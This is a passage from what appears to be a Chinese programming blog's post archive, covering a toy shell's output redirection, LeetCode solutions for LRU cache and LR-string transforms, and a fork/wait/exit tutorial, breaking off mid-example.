*/</span></span><br><span class="line">        <span class="keyword">if</span> (outNum == <span class="number">1</span>)&#123;</span><br><span class="line">            freopen(outFile, <span class="string">"w"</span>, <span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 执行命令 */</span></span><br><span class="line">        <span class="built_in">line</span>[endIdx] = <span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">char</span>** char_list = cut_line(<span class="built_in">line</span>);</span><br><span class="line">        <span class="keyword">int</span> stute = execvp(char_list[<span class="number">0</span>], char_list);</span><br><span class="line">        <span class="built_in">free</span>(char_list);</span><br><span class="line">        <span class="keyword">if</span> (stute == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);<span class="comment">//子进程报错后销毁，返回父进程</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> err = WEXITSTATUS(status); <span class="comment">// 读取子进程的返回码</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (err) &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Error: %s\n"</span>, strerror(err));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数中我们用字符指针onFile对输出重定向的文件名进行标记，同时用到endIdx作为哨兵，记录重定向符&gt;的位置，并在该位置上赋值’\0’，对执行命令的处理，用到freopen对标准输入stdout以写的方式重定向到onFile处。</p>
<p>实现：</p>
<p><img src="https://s2.ax1x.com/2020/01/22/1EEFbD.png" alt="1EEFbD.png"></p>
<p>同时在1.txt文件中：</p>
<p><img src="https://s2.ax1x.com/2020/01/22/1EE3Vg.png" alt="1EE3Vg.png"></p>
<p>则上述就简单实现了输出重定向功能。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解146</title>
    <url>/2020/01/21/LeetCode%E9%A2%98%E8%A7%A3146/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第146题 LRU缓存机制</strong></p>
<p>运用你所掌握的数据结构，设计和实现一个  LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。</p>
<p>获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。<br>写入数据 put(key, value) - 如果密钥不存在，则写入其数据值。当缓存容量达到上限时，它应该在写入新数据之前删除最近最少使用的数据值，从而为新的数据值留出空间。</p>
<p>进阶:</p>
<p>你是否可以在 O(1) 时间复杂度内完成这两种操作？</p>
<p>示例:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LRUCache cache = <span class="keyword">new</span> LRUCache( <span class="number">2</span> <span class="comment">/* 缓存容量 */</span> );</span><br><span class="line"></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">1</span>);       <span class="comment">// 返回  1</span></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">3</span>, <span class="number">3</span>);    <span class="comment">// 该操作会使得密钥 2 作废</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">2</span>);       <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">cache.<span class="built_in">put</span>(<span class="number">4</span>, <span class="number">4</span>);    <span class="comment">// 该操作会使得密钥 1 作废</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">1</span>);       <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">3</span>);       <span class="comment">// 返回  3</span></span><br><span class="line">cache.<span class="built_in">get</span>(<span class="number">4</span>);       <span class="comment">// 返回  4</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">new_node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key=<span class="number">0</span>,value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.prev = <span class="literal">None</span></span><br><span class="line">        self.next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_none</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        node.prev = self.head</span><br><span class="line">        node.next = self.head.next</span><br><span class="line">        self.head.next.prev = node</span><br><span class="line">        self.head.next = node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_node</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        prev = node.prev</span><br><span class="line">        new = node.next</span><br><span class="line">        prev.next = new</span><br><span class="line">        new.prev = prev</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">move_to_head</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        self.remove_node(node)</span><br><span class="line">        self.add_none(node) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_last_node</span><span class="params">(self)</span>:</span></span><br><span class="line">        last = self.tail.prev</span><br><span class="line">        self.remove_node(last)</span><br><span class="line">        <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type capacity: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.cache = &#123;&#125;</span><br><span class="line">        self.size = <span class="number">0</span></span><br><span class="line">        self.capacity = capacity</span><br><span class="line">        self.head = new_node()</span><br><span class="line">        self.tail = new_node()</span><br><span class="line">        self.head.next = self.tail</span><br><span class="line">        self.tail.prev = self.head</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        node = self.cache.get(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">        self.move_to_head(node)</span><br><span class="line">        <span class="keyword">return</span> node.value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key, value)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type key: int</span></span><br><span class="line"><span class="string">        :type value: int</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        node = self.cache.get(key)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">            newnode = new_node(key,value)</span><br><span class="line">            self.cache[key] = newnode</span><br><span class="line">            self.add_none(newnode)</span><br><span class="line">            self.size += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> self.size &gt; self.capacity:</span><br><span class="line">                tail = self.remove_last_node()</span><br><span class="line">                <span class="keyword">del</span> self.cache[tail.key]</span><br><span class="line">                self.size -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node.value = value</span><br><span class="line">            self.move_to_head(node)</span><br><span class="line"><span class="comment"># Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = LRUCache(capacity)</span></span><br><span class="line"><span class="comment"># param_1 = obj.get(key)</span></span><br><span class="line"><span class="comment"># obj.put(key,value)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/21/1k30Mj.png" alt="1k30Mj.png"></p>
<p><strong>解析：</strong></p>
<p>首先，我们看到这个题所要构建的数据结构要求要在常数时间内完成get和put操作，那么可以用到哈希表，也就是python中的字典结构，辅助双向链表记录key-value信息，对于双向链表加入head和tail两个哨兵方便使用。</p>
<p>整体结构为：</p>
<p><img src="https://s2.ax1x.com/2020/01/21/1kc46s.png" alt="1kc46s.png"></p>
<p>我们先构造链表结构：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">new_node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key=<span class="number">0</span>,value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.prev = <span class="literal">None</span></span><br><span class="line">        self.next = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>对于字典结构key值是数据结构中的key，而字典中的value是链表中的结构体Node。</p>
<p>在我们构造LRUcache之前，我们先得构造几种方法，并结合要求使用。</p>
<p>首先，LRU是最近最久未使用，我们可以用双向链表进行对使用时间进行有序排序，即最近到最久的顺序。链表中最后一个，也就是最久没有使用的那一个。</p>
<p>对双向链表进行维护时，会有多种情况：</p>
<ol>
<li><p><strong>put</strong>一个key相同的key-value，我们不用管它们的value是否相同，对我们而言是要原来的key-value进行更新，我们要将原来的key-value<strong>更新后将其位置移动到第一个</strong>。这时候无论cache是否满的，都不会溢出，因为只是更新处理而已。</p>
</li>
<li><p><strong>put</strong>一个新的key-value，我们会构建一个新的key-value结构体，并<strong>加入到链表中放到第一个位置</strong>，在字典中也加入新的key-value，然后判断是否溢出缓存，若溢出，那么将最久未使用也就是链表中<strong>最后一个元素删除</strong>，同时删除字典中该元素的key-value。</p>
<p>上述中我们发现我们还需要：</p>
<ol>
<li><p>在链表中新加Node并放置在第一个位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_none</span><span class="params">(self,node)</span>:</span></span><br><span class="line">	node.prev = self.head</span><br><span class="line">   node.next = self.head.next</span><br><span class="line">   self.head.next.prev = node</span><br><span class="line">   self.head.next = node</span><br></pre></td></tr></table></figure>
</li>
<li><p>移除old_Node：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_node</span><span class="params">(self,node)</span>:</span></span><br><span class="line">    prev = node.prev</span><br><span class="line">    new = node.next</span><br><span class="line">    prev.next = new</span><br><span class="line">    new.prev = prev</span><br></pre></td></tr></table></figure>
</li>
<li><p>将old_Node移动到第一个位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move_to_head</span><span class="params">(self,node)</span>:</span></span><br><span class="line">    self.remove_node(node)</span><br><span class="line">    self.add_none(node)</span><br></pre></td></tr></table></figure>
</li>
<li><p>将最后一个Node删除：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_last_node</span><span class="params">(self)</span>:</span></span><br><span class="line">    last = self.tail.prev</span><br><span class="line">    self.remove_node(last)</span><br><span class="line">    <span class="keyword">return</span> last</span><br></pre></td></tr></table></figure>

<p>返回Node是为了使用它在字典中将它删除。</p>
</li>
</ol>
</li>
<li><p><strong>get</strong>一个key，查询其value，若没有，返回-1，若有，返回其value，并刷新使用时间，也就是将其key-value移动到链表第一个位置。</p>
</li>
</ol>
<p>由上述就可以构造put和get方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key, value)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type key: int</span></span><br><span class="line"><span class="string">    :type value: int</span></span><br><span class="line"><span class="string">    :rtype: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    node = self.cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">        newnode = new_node(key,value)</span><br><span class="line">        self.cache[key] = newnode</span><br><span class="line">        self.add_none(newnode)</span><br><span class="line">        self.size += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.size &gt; self.capacity:</span><br><span class="line">            tail = self.remove_last_node()</span><br><span class="line">            <span class="keyword">del</span> self.cache[tail.key]</span><br><span class="line">            self.size -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        node.value = value</span><br><span class="line">        self.move_to_head(node)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type key: int</span></span><br><span class="line"><span class="string">    :rtype: int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    node = self.cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    self.move_to_head(node)</span><br><span class="line">    <span class="keyword">return</span> node.value</span><br></pre></td></tr></table></figure>

<p>同时对LRUcache的基本属性为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type capacity: int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.cache = &#123;&#125;</span><br><span class="line">    self.size = <span class="number">0</span></span><br><span class="line">    self.capacity = capacity</span><br><span class="line">    self.head = new_node()</span><br><span class="line">    self.tail = new_node()</span><br><span class="line">    self.head.next = self.tail</span><br><span class="line">    self.tail.prev = self.head</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解777</title>
    <url>/2020/01/18/LeetCode%E9%A2%98%E8%A7%A3777/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第777题，在LR字符串中交换相邻字符</strong></p>
<p>在一个由 ‘L’ , ‘R’ 和 ‘X’ 三个字符组成的字符串（例如”RXXLRXRXL”）中进行移动操作。一次移动操作指用一个”LX”替换一个”XL”，或者用一个”XR”替换一个”RX”。现给定起始字符串start和结束字符串end，请编写代码，当且仅当存在一系列移动操作使得start可以转换成end时， 返回True。</p>
<p><strong>示例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">输入: start = <span class="string">"RXXLRXRXL"</span>, end = <span class="string">"XRLXXRRLX"</span></span><br><span class="line">输出: <span class="literal">True</span></span><br><span class="line">解释:</span><br><span class="line">我们可以通过以下几步将start转换成end:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong></p>
<ol>
<li><code>1 &lt;= len(start) = len(end) &lt;= 10000</code>。</li>
<li><code>start</code>和<code>end</code>中的字符串仅限于<code>&#39;L&#39;</code>, <code>&#39;R&#39;</code>和<code>&#39;X&#39;</code>。</li>
</ol>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canTransform</span><span class="params">(self, start, end)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type start: str</span></span><br><span class="line"><span class="string">        :type end: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> (len(start) != len(end)):</span><br><span class="line">            <span class="keyword">return</span> bool(<span class="number">0</span>)</span><br><span class="line">        n = len(start)</span><br><span class="line">        sl = <span class="number">0</span></span><br><span class="line">        sr = <span class="number">0</span></span><br><span class="line">        el = <span class="number">0</span></span><br><span class="line">        er = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> start[i] == <span class="string">'L'</span>:</span><br><span class="line">                sl += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> start[i] == <span class="string">'R'</span>:</span><br><span class="line">                sr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> end[i] == <span class="string">'L'</span>:</span><br><span class="line">                el += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> end[i] == <span class="string">'R'</span>:</span><br><span class="line">                er += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> (sl &gt; el) | (sr &lt; er):</span><br><span class="line">                <span class="keyword">return</span> bool(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> bool((sl == el) &amp; (sr == er) &amp; (sl + sr &lt; n))</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/18/19nlMF.png" alt="19nlMF.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">canTransform</span><span class="params">(<span class="keyword">char</span> * start, <span class="keyword">char</span> * <span class="built_in">end</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(start) != <span class="built_in">strlen</span>(<span class="built_in">end</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span> , n = <span class="built_in">strlen</span>(start);</span><br><span class="line">    <span class="keyword">int</span> sl = <span class="number">0</span>,sr = <span class="number">0</span>,el = <span class="number">0</span>,er = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(start[i]==<span class="string">'L'</span>)</span><br><span class="line">            sl++;</span><br><span class="line">        <span class="keyword">if</span>(start[i]==<span class="string">'R'</span>)</span><br><span class="line">            sr++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">end</span>[i]==<span class="string">'L'</span>)</span><br><span class="line">            el++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">end</span>[i]==<span class="string">'R'</span>)</span><br><span class="line">            er++;</span><br><span class="line">        <span class="keyword">if</span>((sl &gt; el) || (sr &lt; er))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (sl == el) &amp;&amp; (sr == er) &amp;&amp; (sl + sr &lt; n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/18/19nYI1.png" alt="19nYI1.png"></p>
<p><strong>做题原理：</strong></p>
<p>注意：注意L只会向左移R只会向右移</p>
<ol>
<li><p>先判等start和end的长度（肯定是相等的）。</p>
</li>
<li><p>记录下start和end中’L’和’R’的个数</p>
</li>
<li><p>同时遍历start和end</p>
<p>​            <img src="https://s2.ax1x.com/2020/01/18/19nZan.png" alt="19nZan.png"></p>
</li>
</ol>
<p>发现对’L’来说对于<strong>true</strong>的start到end：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sl &lt;= el</span><br><span class="line">sr &gt;= er</span><br></pre></td></tr></table></figure>

<p>因为’L’在变化的时候只会和它的左边对换位置，即对于start来说有可能会使 <strong>i 线</strong>右边的’L’对换到 <strong>i 线</strong>的左边，导致:</p>
<p>​          <strong>sl &lt;= el</strong></p>
<p>同理，因为’R’在变化的时候只会和它右边对换位置，即对于start来说有可能会使 <strong>i 线</strong>左边的’R’对换到 <strong>i 线</strong>的右边，导致:</p>
<p>​          <strong>sr &gt;= er</strong></p>
<p>则可以用(sl &gt; el) || (sr &lt; er)来判断false。</p>
<ol start="4">
<li><p>最后如若上述条件都满足，还要保证end是由start变化而来，即要满足(sl == el) &amp;&amp; (sr == er) &amp;&amp; (sl + sr &lt; n)，则为true。(注意：sl+sr&lt;n是因为还有’X’的存在)</p>
<p>​    </p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>fork</title>
    <url>/2020/01/15/fork/</url>
    <content><![CDATA[<h1 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        一个进程，包括代码、数据和分配给进程的资源。</p>
<p>​        fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。<br>​        一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了一个自己。</p>
<a id="more"></a>

<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;	</span><br><span class="line">	<span class="keyword">pid_t</span> child_pid;</span><br><span class="line">	<span class="comment">/*fork函数</span></span><br><span class="line"><span class="comment">	*作用：系统调用，产生一个子进程,调用一次返回两次</span></span><br><span class="line"><span class="comment">	*返回值：pid_t类型，在头文件中定义，通常为整形</span></span><br><span class="line"><span class="comment">	*	0	子进程返回</span></span><br><span class="line"><span class="comment">	*	ID	父进程返回的子进程ID</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	child_pid=fork();</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(child_pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"the failure\n"</span>);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">	<span class="keyword">if</span>(child_pid==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"the child\n"</span>);</span><br><span class="line">			sleep(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"child's pid is %d"</span>,child_pid);</span><br><span class="line">            <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"> 			<span class="keyword">for</span>(;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"the father\n"</span>);</span><br><span class="line">               sleep(<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">	&#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"I'm over\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            <strong>那么调用这个fork函数时发生了什么呢？</strong></p>
<p>​            fork函数启动一个新的进程，前面我们说过，这个进程几乎是当前进程的一个拷贝：子进程和父进程使用相同的代码段；子进程复制父进程的堆栈段和数据段。</p>
<p>​            这样，父进程的所有数据都可以留给子进程，但是，子进程一旦开始运行，虽然它继承了父进程的一切数据，但实际上数据却已经分开，相互之间不再有影响了，也就是说，它们之间不再共享任何数据了。它们再要交互信息时，只有通过进程间通信来实现。</p>
<p>​            <strong>既然它们如此相象，系统如何来区分它们呢？</strong></p>
<p>​            这是由函数的返回值来决定的。对于父进程，fork函数返回了子程序的进程号，而对于子程序，fork函数则返回零。在操作系统中，我们用ps就可以看到不同的进程号，对父进程而言，它的进程号是由比它更低层的系统调用赋予的，而对于子进程而言，它的进程号即是fork函数对父进程的返回值。在程序设计中，父进程和子进程都要调用函数fork（）下面的代码，而我们就是利用fork（）函数对父子进程的不同返回值用if…else…语句来实现让父子进程完成不同的功能。</p>
<p>​         <strong><em>正如我们上面举的例子一样。我们看到，上面例子执行时两条信息是交互无规则的打印出来的，这是父子进程独立执行的结果，虽然我们的代码似乎和串行的代码没有什么区别。</em></strong></p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>　　 如果一个大程序在运行中，它的数据段和堆栈都很大，一次fork就要复制一次，那么fork的系统开销不是很大吗？其实UNIX自有其解决的办法，大家知道，一般CPU都是以”页”为单位来分配内存空间的，每一个页都是实际物理内存的一个映像，象INTEL的CPU，其一页在通常情况下是4086字节大小，而无论是数据段还是堆栈段都是由许多”页”构成的，fork函数复制这两个段，只是”逻辑”上的，并非”物理”上的，也就是说，实际执行fork时，物理空间上两个进程的数据段和堆栈段都还是共享着的，当有一个进程写了某个数据时，这时两个进程之间的数据才有了区别，系统就将有区别的”页”从物理上也分开。系统在空间上的开销就可以达到最小。</p>
<h1 id="wait-and-exit"><a href="#wait-and-exit" class="headerlink" title="wait and exit"></a>wait and exit</h1><h2 id="定义函数wait"><a href="#定义函数wait" class="headerlink" title="定义函数wait()"></a>定义函数wait()</h2><p>​        <code>pid_t wait (int * status);</code></p>
<ul>
<li>wait()会暂时停止目前进程的执行,直到有信号来到或子进程结束。</li>
<li>如果在调用 wait()时子进程已经结束,则 wait()会立即返回子进程结束状态值</li>
<li>子进程的结束状态值会由参数 status 返回,而子进程的进程识别码也会一起返回。</li>
<li>如果不在意结束状态值,则参数<code>status</code> 可以设成 <code>NULL</code>。</li>
</ul>
<p><img src="https://i.loli.net/2019/12/19/K2htdg6MQ4bLN1P.png" alt="UTOOLS1576735868543.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> pid_1;</span><br><span class="line"><span class="keyword">int</span> status=<span class="number">0</span>;</span><br><span class="line">pid_1=wait(&amp;status);</span><br></pre></td></tr></table></figure>

<p><strong><code>status</code>的使用</strong></p>
<h2 id="定义函数exit"><a href="#定义函数exit" class="headerlink" title="定义函数exit()"></a>定义函数exit()</h2><p>exit() 结束当前进程/程序，在整个进程/程序中，只要调用 exit ，就结束。</p>
<p><code>void exit(int status)</code></p>
<p>传入的参数是程序退出时的状态码，0表示正常退出，其他表示非正常退出，一般都用-1或者1，标准C里有EXIT_SUCCESS和EXIT_FAILURE两个宏，用exit(EXIT_SUCCESS)可读性比较好一点。</p>
<h2 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid_1,pid_2;</span><br><span class="line">        </span><br><span class="line">    pid_1 = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid_1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"the failure\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid_1 == <span class="number">0</span>)&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"I am a child process i am going to sleep\n"</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I am a child process and I exit normally\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        pid_2 = 